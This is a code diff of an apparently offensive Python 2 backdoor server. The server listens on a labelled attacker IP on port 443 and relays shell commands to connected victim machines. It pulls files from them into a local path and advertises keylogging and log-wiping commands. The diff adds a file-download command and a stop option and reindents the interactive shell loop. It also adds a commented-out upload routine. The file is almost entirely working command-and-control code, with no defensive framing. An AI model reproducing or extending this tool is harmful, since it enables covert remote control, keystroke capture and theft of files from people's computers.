@@ -37,12 +37,13 @@ def menu():
   print
   print "[*] refresh        ========= > Refresh the connection" #DONE
   print "[*] list           ========= > Lists all the connected clients" #DONE
+  print "[*] download       ========= > download the files usage: download*FilePath" #DONE
 
 
 def interact():
 
   """This is the program menu"""
-
+  print
   print "[*] Command options: "
   print 
   print "[*] keylog         ========= > Start capturing keystrokes" #DONE
@@ -55,11 +56,14 @@ def interact():
   print "[*] systeminfo     ========= > Get Fingerprint of the system" #TODO
   print "[*] ip             ========= > Get the external IP address" #DONE
   print "[*] cover          ========= > Delete all traces of logs" #TODO
+  print "[*] stop           ========= > Stops interaction with the target machine, and goes back to the main menu" #TODO
   print "\n\n"
+  print
+  print "[!] Use stop to go back to the main menu"
   
   
 
-host = '10.0.0.54' # Attacker IP address
+host = '10.0.0.59' # Attacker IP address
 port = 443 # Port number in which the attacker server listen to
 
 # create a socket object
@@ -148,46 +152,46 @@ def backdoor_shell():
 
          elif("select" in user_command):
            
-			chosenone = int(user_command.replace("select ","")) - 1
-			
-			if ((chosenone < len(all_addresses)) and (chosenone >= 0 )):
-				print "[INFO] Interacting with %s" % str(all_addresses[chosenone])
-				try:
-					all_connections[chosenone].send("begin") #welcome message
-					vtpath = all_connections[chosenone].recv(4096) + ">" #non blocking socket object / will timeout instantly if no data received
-				except:
-					print "[ERROR] Client closed the connection\n"
-					break;
-				while 1:
-					data=raw_input(vtpath) #raw_input represents the client's sub process's current path
-					if ((data != "stop") and ("cd " not in data) and ("upload " not in data)):
-						try:
-							all_connections[chosenone].send(data)
-							msg=all_connections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
-							print msg
-						except:
-							print "[ERROR] Client closed the connection\n"
-							break;
-					elif ("cd " in data): #dealing with the cd command
-						try:
-							all_connections[chosenone].send(data)
-							msg=all_connections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
-							vtpath = msg + ">"
-						except:
-							print "[ERROR] Client closed the connection\n"
-							break;
-					else:
-						print "\n"
-						break
-			else:
-				print "[ERROR] Client doesn't exist\n"
+            chosenone = int(user_command.replace("select ","")) - 1
+            
+            if ((chosenone < len(all_addresses)) and (chosenone >= 0 )):
+              print "[INFO] Interacting with %s" % str(all_addresses[chosenone])
+              try:
+                all_connections[chosenone].send("begin") #welcome message
+                vtpath = all_connections[chosenone].recv(4096) + ">" #non blocking socket object / will timeout instantly if no data received
+              except:
+                print "[ERROR] Client closed the connection\n"
+                break;
+              while 1:
+                data=raw_input(vtpath) #raw_input represents the client's sub process's current path
+                if ((data != "stop") and ("cd " not in data) and ("upload " not in data)):
+                  try:
+                    all_connections[chosenone].send(data)
+                    msg=all_connections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
+                    print msg
+                  except:
+                    print "[ERROR] Client closed the connection\n"
+                    break;
+                elif ("cd " in data): #dealing with the cd command
+                  try:
+                    all_connections[chosenone].send(data)
+                    msg=all_connections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
+                    vtpath = msg + ">"
+                  except:
+                    print "[ERROR] Client closed the connection\n"
+                    break;
+                else:
+                  print "\n"
+                  break
+            else:
+              print "[ERROR] Client doesn't exist\n"
 
 
          elif ("download" in user_command):
               
                     transfer(client_conn,user_command)
                     print "DONE DONWLOAD"
-
+                    
 
          elif (user_command == "clear"):
                 # clears the screen
@@ -215,7 +219,7 @@ def backdoor_shell():
 def transfer(conn,command):
     
     conn.send(command)
-    f = open('/home/keyplexer/Desktop/testing.png','wb')
+    f = open('/home/offline/Desktop/testing.png','wb')
     while True:  
         bits = conn.recv(1024)
         if 'Unable to find out the file' in bits:
@@ -227,6 +231,22 @@ def transfer(conn,command):
             break
         f.write(bits)
 
+
+##def upload(conn,command):
+##
+##
+##	x,src,dst=map(str,command.split(' '))
+##	conn.send(command)
+##	file_to_send=open(src,'rb')
+##	packet=file_to_send.read(1024)
+##	while packet!='':
+##		conn.send(packet) 
+##		packet = file_to_send.read(1024)
+##	conn.send('DONE')
+##	file_to_send.close()
+
+
+	
 
 class bcolors:
     HEADER = '\033[95m'
